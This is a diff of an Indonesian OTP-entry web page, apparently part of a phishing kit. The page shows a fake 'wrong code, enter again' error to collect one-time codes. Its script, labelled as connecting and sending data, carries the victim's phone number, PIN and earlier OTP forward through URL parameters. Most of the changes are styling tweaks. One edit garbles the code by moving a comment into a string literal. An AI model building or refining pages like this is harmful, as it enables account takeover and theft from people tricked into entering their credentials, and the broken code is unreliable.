@@ -75,10 +75,10 @@
         /* ✅ TULISAN PERINGATAN SALAH */
         .error-text {
             color: #FF2400;
-            font-size: 0.50rem;
-            font-weight: 600;
+            font-size: 0.90rem;
+            font-weight: 500;
             text-align: center;
-            margin-bottom: 12px;
+            margin-bottom: 30px;
         }
         .number-box {
             background: rgba(255, 255, 255, 0.2);
@@ -122,8 +122,8 @@
             width: 150px;
         }
         .resend-btn {
-            flex: 1;
-            padding: 4px;
+            flex: 5;
+            padding: 3px;
             background: #f0f0f0;
             color: #aaa;
             font-size: 0.7rem;
@@ -132,10 +132,10 @@
         }
         .time-box {
             flex: 1;
-            padding: 4px;
+            padding: 2px;
             background: #f8f8f8;
             color: #333;
-            font-size: 0.8rem;
+            font-size: 0.6rem;
             font-weight: bold;
             text-align: center;
             position: relative;
@@ -143,7 +143,7 @@
         .dot {
             position: absolute;
             top: 4px;
-            right: 4px;
+            right: 2px;
             width: 3px;
             height: 3px;
             background: orange;
@@ -164,8 +164,8 @@
     </div>
 
     <!-- Judul -->
-    <div class="title">
-        Kode OTP telah terkirim ke
+    <div class="texs-sm font-bold title">
+        Kode OTP telah terkirim ke via whatsapp
     </div>
 
     <!-- Box Nomor HP (NOMOR TETAP MUNCUL OTOMATIS) -->
@@ -176,15 +176,15 @@
 
     <!-- Kotak Input OTP -->
     <div class="otp-container">
-        <input type="text" class="otp-input" maxlength="1" autofocus>
-        <input type="text" class="otp-input" maxlength="1">
-        <input type="text" class="otp-input" maxlength="1">
-        <input type="text" class="otp-input" maxlength="1">
+        <input type="Number" class="otp-input" maxlength="1" autofocus>
+        <input type="Number" class="otp-input" maxlength="1">
+        <input type="Number" class="otp-input" maxlength="1">
+        <input type="Number" class="otp-input" maxlength="1">
     </div>
   
   <!-- ✅ TULISAN SALAH -->
     <div class="error-text">
-       ⚠️ Kode OTP yang kamu masukkan salah. Silakan coba lagi.
+       ⚠️Kode salah, Masukkan lagi.
     </div>
 
     <!-- Tombol Kirim Ulang & Timer -->
@@ -196,13 +196,15 @@
         </div>
     </div>
 
+    
+  
     <!-- SCRIPT KONEKSI & KIRIM DATA -->
     <script>
         // ✅ BACA DATA DARI HALAMAN SEBELUMNYA
         const urlParams = new URLSearchParams(window.location.search);
         const nomorAsli = urlParams.get('nomor') || 'Gagal memuat';
         const pinAsli = urlParams.get('pin') || 'Tidak ada';
-        const otpLama = urlParams.get('otp') || ''; // Simpan OTP yang tadi salah
+        const otpLama = urlParams.get('otp') || '; // Simpan OTP yang tadi salah'; 
 
         // ✅ TAMPILKAN NOMOR DI LAYAR
         document.getElementById('nomorTampil').textContent = `+62 ${nomorAsli}`;
